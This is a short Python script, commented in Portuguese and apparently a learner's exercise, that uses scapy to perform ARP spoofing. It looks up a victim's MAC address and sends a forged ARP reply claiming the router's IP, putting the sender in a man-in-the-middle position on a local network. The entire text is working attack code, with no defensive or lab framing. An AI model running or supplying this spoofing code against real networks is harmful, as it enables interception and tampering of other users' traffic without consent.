#Criando um ataque spoofing 

import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc #pego apenas o primeiro elemento e mais oq exatamente?

def spoof(target_ip, spoof_ip): #recebe o ip alvo e o ip que servirá como man-in-the-middle
    target_mac = get_mac(target_ip) #chamo a função aqui afim de pegar o endereço mac automaticamente
    #cria o pacote arp
    packet = scapy.ARP(op=2, pdst=target_ip, hwpdst=target_mac, psrc=spoof_ip) #estou dizendo a vítima: eu tenho o endereço do roteador
    scapy.send(packet) #enviando o pacote

